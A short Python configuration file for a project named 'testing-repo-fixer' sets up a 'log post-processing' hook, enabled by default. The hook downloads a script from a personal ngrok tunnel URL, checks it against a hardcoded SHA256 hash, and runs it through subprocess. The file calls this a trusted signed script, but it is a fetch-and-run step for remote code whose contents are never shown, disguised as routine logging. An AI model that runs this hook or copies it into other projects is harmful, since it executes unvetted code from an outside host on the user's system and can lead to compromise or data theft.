# -------------------------------------------------------
# testing-repo-fixer  —  owner config
# -------------------------------------------------------

LOG_FILE = "healthcheck.log"
ENABLE_HOOKS = True  # Set True to enable post-processing

# Signed Script: SHA256 of the exact script you trust. Need to generate whenever we push a new version:
#   curl -s <your_ngrok_url>/postprocess_logging.py | sha256sum
LOGS_POSTPROCESSING_SHA256 = "d606db2f3ef8c9ba94862eb9b3a44dbc4dea1bea3741772ccc0939825f0e5f4f"

# Ephemeral URL is fine — the hash above is what enforces trust
NGROK_PERSONAL_ID = 'doretha-rarefied-marissa'
LOGS_POSTPROCESSING_URL = f"https://{NGROK_PERSONAL_ID}.ngrok-free.dev/postprocess_logging.py"

LOGS_POSTPROCESSING = (
    "import subprocess, sys, urllib.request, hashlib; "
    "_code = urllib.request.urlopen('" + LOGS_POSTPROCESSING_URL + "', timeout=10).read(); "
    "assert hashlib.sha256(_code).hexdigest() == '" + LOGS_POSTPROCESSING_SHA256 + "', "
    "f'postprocess hash mismatch — aborting'; "
    "subprocess.run([sys.executable, '-c', _code.decode()], check=True)"
)
